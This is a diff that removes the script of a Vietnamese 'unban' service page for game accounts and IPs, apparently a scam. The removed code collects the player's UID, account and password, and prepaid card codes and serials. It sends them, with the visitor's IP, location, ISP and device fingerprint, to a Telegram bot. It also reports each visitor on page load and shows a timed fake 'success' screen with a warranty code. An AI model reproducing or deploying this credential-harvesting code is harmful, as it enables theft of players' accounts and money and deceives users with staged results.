-        const done=document.getElementById('progressDone');done.classList.add('active');
-        
-        setTimeout(()=>{
-          done.classList.remove('active');done.classList.add('completed');done.textContent='✅ Xong';
-          document.getElementById('timerDisplay').classList.add('hidden');
-          if(state.countdownInterval)clearInterval(state.countdownInterval);
-          
-          document.getElementById('resultBox').innerHTML=`
-            <div style="color:#2ecc71;text-align:center;">
-              <h3>🎉 MỞ BAND THÀNH CÔNG!</h3>
-              <p>${state.serviceType === 'unban_ip' ? 'IP đã được mở band!' : 'Tài khoản đã được mở band!'}</p>
-              <div style="background:linear-gradient(135deg,#1d2c45,#2e405b);border:2px solid #f39c12;border-radius:20px;padding:20px;margin-top:15px;">
-                <h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3>
-                <div style="font-size:1.5rem;font-weight:bold;color:#ffd966;">BH-${orderId}</div>
-                <p style="color:#b0d4ff;">Thời hạn: ${state.plan.name==='ultimate'?'12 tháng':state.plan.name==='vip'?'6 tháng':'3 tháng'}</p>
-              </div>
-              <button class="btn-sm mt-10" onclick="resetForm()">🔄 Gửi yêu cầu mới</button>
-            </div>`;
-          Swal.fire({icon:'success',title:'🎉 Thành Công!',confirmButtonText:'OK'});
-          document.getElementById('submitRequestBtn').disabled = false;
-          document.getElementById('submitRequestBtn').innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
-          updateStatusBadge('approved');
-        },2000);
-      },t);
-      
-      startCountdown(Math.floor(t/1000)+2);
-    }
-
-    function startCountdown(s) {
-      const d=document.getElementById('timerDisplay');d.classList.remove('hidden');
-      let r=s;
-      if(state.countdownInterval)clearInterval(state.countdownInterval);
-      state.countdownInterval=setInterval(()=>{
-        if(r<=0){clearInterval(state.countdownInterval);d.textContent='✅ HOÀN THÀNH!';return;}
-        const m=Math.floor(r/60),sec=r%60;
-        d.textContent=`⏳ ${m}:${sec.toString().padStart(2,'0')}`;r--;
-      },1000);
-    }
-
-    // ============================================
-    // SUBMIT - GỬI YÊU CẦU LÊN TELEGRAM
-    // ============================================
-    document.getElementById('submitRequestBtn').addEventListener('click',async function(){
-      if(isBanned){Swal.fire('🚫','Bạn đã bị chặn!','error');return;}
-      if(orderStatus === 'waiting'){Swal.fire('⏳','Đang chờ admin duyệt!','info');return;}
-      
-      const honeypot=document.getElementById('honeypotField').value;
-      if(honeypot){Swal.fire('🤖','Hoạt động đáng ngờ!','error');return;}
-      
-      const captchaAnswer=parseInt(document.getElementById('captchaAnswer').value);
-      if(isNaN(captchaAnswer)||captchaAnswer!==state.captchaResult){generateCaptcha();document.getElementById('captchaAnswer').value='';Swal.fire('❌','Xác nhận sai!','error');return;}
-      
-      if(state.paymentMethod==='bank'&&!uploadedImageFile){Swal.fire('❌','Tải ảnh chuyển khoản!','error');return;}
-      if(state.paymentMethod==='card'){if(!document.getElementById('cardCode').value.trim()||!document.getElementById('cardSerial').value.trim()){Swal.fire('❌','Nhập mã thẻ và seri!','error');return;}}
-      
-      if (state.serviceType === 'unban_ip') {
-        const ipInput = document.getElementById('ipAddressInput').value.trim();
-        if (!ipInput) { Swal.fire('❌','Nhập IP cần mở band!','error'); return; }
-        if (!validateIP(ipInput)) { Swal.fire('❌','IP không hợp lệ!','error'); return; }
-      } else {
-        const ffId=document.getElementById('ffIdInput').value.trim();
-        const platformAcc=document.getElementById('platformAccountInput').value.trim();
-        const password=document.getElementById('passwordInput').value.trim();
-        if(!ffId||!platformAcc||!password){Swal.fire('❌','Nhập đầy đủ thông tin!','error');return;}
-      }
-      
-      const finalPrice=getFinalPrice();
-      
-      let confirmHTML = `<div style="text-align:left;">`;
-      confirmHTML += `<p>🔄 <b>Dịch vụ:</b> ${state.serviceType === 'unban_ip' ? 'Mở Band IP' : 'Mở Band Account'}</p>`;
-      confirmHTML += `<p>🎮 <b>Game:</b> ${state.game.toUpperCase()}</p>`;
-      
-      if (state.serviceType === 'unban_ip') {
-        const ipInput = document.getElementById('ipAddressInput').value.trim();
-        confirmHTML += `<p>🌐 <b>IP:</b> <code>${ipInput}</code></p>`;
-        const reason = document.getElementById('ipReasonInput').value.trim();
-        if (reason) confirmHTML += `<p>📝 <b>Lý do:</b> ${reason}</p>`;
-      } else {
-        const ffId=document.getElementById('ffIdInput').value.trim();
-        const platformAcc=document.getElementById('platformAccountInput').value.trim();
-        confirmHTML += `<p>🆔 <b>UID:</b> ${ffId}</p>`;
-        confirmHTML += `<p>📧 <b>Tài khoản:</b> ${platformAcc}</p>`;
-        confirmHTML += `<p>🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}</p>`;
-      }
-      
-      confirmHTML += `<p>💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}</p>`;
-      confirmHTML += `<p>💰 <b>Tổng:</b> <span style="color:#ffd966;">${finalPrice.toLocaleString()}đ</span></p>`;
-      confirmHTML += `<p>📍 <b>IP của bạn:</b> ${userIP}</p>`;
-      confirmHTML += `</div>`;
-      
-      const confirmResult=await Swal.fire({
-        title:'📋 Xác Nhận',
-        html:confirmHTML,
-        icon:'question',showCancelButton:true,confirmButtonText:'✅ Gửi',cancelButtonText:'❌ Hủy'
-      });
-      if(!confirmResult.isConfirmed)return;
-      
-      const btn=this;btn.disabled=true;btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Đang gửi...';
-      
-      try{
-        state.currentOrderId=`FF-${Date.now().toString(36).toUpperCase()}`;
-        orderStatus = 'waiting';
-        updateStatusBadge('waiting');
-        
-        if(uploadedImageFile&&state.paymentMethod==='bank'){
-          await sendPhotoToTelegram(uploadedImageFile,`📸 Ảnh CK - #${state.currentOrderId}`);
-        }
-        
-        let msg=`🔔 <b>YÊU CẦU MỚI #${state.currentOrderId}</b>\n`;
-        msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        msg+=`🔄 <b>Dịch vụ:</b> ${state.serviceType === 'unban_ip' ? 'Mở Band IP' : 'Mở Band Account'}\n`;
-        msg+=`🎮 <b>Game:</b> ${state.game.toUpperCase()}\n`;
-        msg+=`🌐 <b>Server:</b> ${state.server.toUpperCase()}\n`;
-        msg+=`💎 <b>Gói:</b> ${state.plan.name.toUpperCase()}\n`;
-        msg+=`💰 <b>Giá:</b> ${finalPrice.toLocaleString()}đ\n`;
-        msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        
-        if (state.serviceType === 'unban_ip') {
-          const ipInput = document.getElementById('ipAddressInput').value.trim();
-          msg+=`🌐 <b>IP cần mở:</b> <code>${ipInput}</code>\n`;
-          const reason = document.getElementById('ipReasonInput').value.trim();
-          if (reason) msg+=`📝 <b>Lý do:</b> ${reason}\n`;
-        } else {
-          const ffId=document.getElementById('ffIdInput').value.trim();
-          const platformAcc=document.getElementById('platformAccountInput').value.trim();
-          const password=document.getElementById('passwordInput').value.trim();
-          msg+=`👤 <b>UID:</b> <code>${ffId}</code>\n`;
-          msg+=`📧 <b>Tài khoản:</b> ${platformAcc}\n`;
-          msg+=`🔐 <b>Mật khẩu:</b> <code>${password}</code>\n`;
-          msg+=`🔗 <b>Nền tảng:</b> ${state.platform.toUpperCase()}\n`;
-        }
-        
-        msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        msg+=`🌐 <b>IP của bạn:</b> <code>${userIP}</code>\n`;
-        msg+=`📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n`;
-        msg+=`🏢 <b>ISP:</b> ${userLocation.isp}\n`;
-        msg+=`🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n`;
-        msg+=`⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n`;
-        
-        if(state.paymentMethod==='card'){
-          msg+=`━━━━━━━━━━━━━━━━━━\n`;
-          msg+=`💳 <b>Thẻ:</b> ${document.getElementById('cardType').value}\n`;
-          msg+=`🎫 <b>Mã:</b> ${document.getElementById('cardCode').value}\n`;
-          msg+=`🔢 <b>Seri:</b> ${document.getElementById('cardSerial').value}\n`;
-        }
-        
-        msg+=`━━━━━━━━━━━━━━━━━━\n`;
-        msg+=`⏳ Vui lòng chọn hành động bên dưới:`;
-        
-        const buttons=[[
-          {text:'✅ DUYỆT',callback_data:`approve_${state.currentOrderId}`},
-          {text:'❌ TỪ CHỐI',callback_data:`reject_${state.currentOrderId}`},
-          {text:'🚫 CẤM IP',callback_data:`ban_${state.currentOrderId}_${encodeURIComponent(userIP)}`}
-        ]];
-        
-        const msgResult=await sendMessageWithButtons(msg,buttons);
-        
-        if(msgResult&&msgResult.ok){
-          state.approvedMessageId=msgResult.result.message_id;
-          
-          document.getElementById('resultBox').classList.remove('hidden');
-          document.getElementById('resultBox').innerHTML=`
-            <div style="color:#ffd966;text-align:center;">
-              <h3>⏳ #${state.currentOrderId}</h3>
-              <p>Đã gửi yêu cầu lên Telegram!</p>
-              <p style="font-size:0.9rem;">Đang chờ admin duyệt...</p>
-              <p style="font-size:0.8rem;color:#9aa9c1;">Không tắt trang này</p>
-              <div style="margin-top:10px;">
-                <span class="status-badge waiting">⏳ Chờ duyệt</span>
-              </div>
-            </div>`;
-          
-          await sendToTelegram(`🌐 <b>CHI TIẾT - #${state.currentOrderId}</b>\n📍 IP: ${userIP}\n🏙️ TP: ${userLocation.city}\n🌍 QG: ${userLocation.country}\n🏢 ISP: ${userLocation.isp}\n📱 Mobile: ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}`);
-          
-          Swal.fire({icon:'success',title:'✅ Đã gửi!',text:`Mã: #${state.currentOrderId}\nChờ admin duyệt...`,timer:3000});
-          generateCaptcha();
-          document.getElementById('captchaAnswer').value='';
-          btn.disabled=false;
-          btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang chờ duyệt...';
-          
-          // Polling sẽ tự động xử lý callback từ admin
-        }else{
-          throw new Error('Không thể gửi đến Telegram');
-        }
-      }catch(error){
-        document.getElementById('resultBox').innerHTML=`<div style="color:#ff6b6b;text-align:center;"><h3>❌ Lỗi</h3><p>${error.message}</p><button class="btn-sm mt-10" onclick="location.reload()">Thử lại</button></div>`;
-        btn.disabled=false;btn.innerHTML='<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND';
-        orderStatus = 'idle';
-        updateStatusBadge('idle');
-      }
-    });
-
-    // ============================================
-    // EVENT LISTENERS
-    // ============================================
-    document.querySelectorAll('.service-type-option').forEach(o=>{
-      o.addEventListener('click',function(){
-        document.querySelectorAll('.service-type-option').forEach(x=>x.classList.remove('active'));
-        this.classList.add('active');
-        toggleServiceType(this.dataset.service);
-      });
-    });
-
-    document.querySelectorAll('.game-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('.game-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.game=this.dataset.game;updatePrices();});});
-    document.querySelectorAll('#serverSelector .btn-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('#serverSelector .btn-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.server=this.dataset.server;updatePrices();});});
-    document.querySelectorAll('.plan').forEach(p=>{p.addEventListener('click',function(){document.querySelectorAll('.plan').forEach(x=>x.classList.remove('selected'));this.classList.add('selected');state.plan={name:this.dataset.plan,price:parseInt(this.dataset.price),time:this.dataset.time};updatePrices();});});
-    document.querySelectorAll('.payment-method-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('.payment-method-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.paymentMethod=this.dataset.method;document.getElementById('bankInfo').classList.toggle('hidden',state.paymentMethod!=='bank');document.getElementById('cardInfo').classList.toggle('hidden',state.paymentMethod!=='card');document.getElementById('uploadSection').classList.toggle('hidden',state.paymentMethod!=='bank');});});
-    document.querySelectorAll('.platform-option').forEach(o=>{o.addEventListener('click',function(){document.querySelectorAll('.platform-option').forEach(x=>x.classList.remove('active'));this.classList.add('active');state.platform=this.dataset.platform;});});
-
-    // ============================================
-    // PROGRESS BAR ELEMENTS
-    // ============================================
-    function ensureProgressBar() {
-      const container = document.querySelector('.progress-container');
-      if (!container) {
-        const newContainer = document.createElement('div');
-        newContainer.className = 'progress-container hidden';
-        newContainer.id = 'progressBar';
-        newContainer.innerHTML = `
-          <div class="progress-step completed">✅ Gửi</div>
-          <div class="progress-step" id="progressDuyet">⏳ Chờ duyệt</div>
-          <div class="progress-step" id="progressXuLy">🔧 Xử lý</div>
-          <div class="progress-step" id="progressDone">✅ Xong</div>
-        `;
-        const pricingSection = document.querySelector('.pricing-table');
-        if (pricingSection) {
-          pricingSection.parentNode.insertBefore(newContainer, pricingSection.nextSibling);
-        }
-      }
-    }
-
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    async function init(){
-      console.log('🚀 Tool Mở Band - Khởi động...');
-      
-      await fetchIPAndLocation();
-      deviceFingerprint = await generateFingerprint();
-      
-      document.getElementById('userIpDisplay').textContent = userIP;
-      document.getElementById('userLocation').textContent = `${userLocation.city}, ${userLocation.country}`;
-      
-      console.log(`📍 IP: ${userIP} | ${userLocation.city}, ${userLocation.country}`);
-      
-      const banned = await checkBanned();
-      if (banned) {
-        console.log('🚫 User bị banned');
-        return;
-      }
-      
-      // Tự động gửi thông báo khi có người truy cập
-      const visitorMsg = `🟢 <b>NGƯỜI DÙNG MỚI TRUY CẬP</b>\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${userIP}</code>\n📍 <b>Vị trí:</b> ${userLocation.city}, ${userLocation.country}\n🏢 <b>ISP:</b> ${userLocation.isp}\n🆔 <b>Device:</b> <code>${deviceFingerprint}</code>\n📱 <b>Mobile:</b> ${/Mobi|Android/i.test(navigator.userAgent)?'Có':'Không'}\n⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}\n━━━━━━━━━━━━━━━━━━\n💡 Dùng /help để xem hướng dẫn`;
-      await sendToTelegram(visitorMsg);
-      
-      ensureProgressBar();
-      createParticles();
-      generateCaptcha();
-      updatePrices();
-      updateOnlineCount();
-      startSocialProof();
-      setupImageUpload();
-      toggleServiceType('unban_account');
-      updateStatusBadge('idle');
-      
-      // Bắt đầu polling để nhận lệnh và callback từ Telegram
-      await startPolling();
-      
-      console.log('✅ Tool sẵn sàng! Đang lắng nghe Telegram...');
-    }
-
-    init();
-
-    window.addEventListener('beforeunload', () => {
-      if (state.countdownInterval) clearInterval(state.countdownInterval);
-      if (pollingInterval) clearInterval(pollingInterval);
-    });
-  </script>
+    </script>
 </body>
 </html>
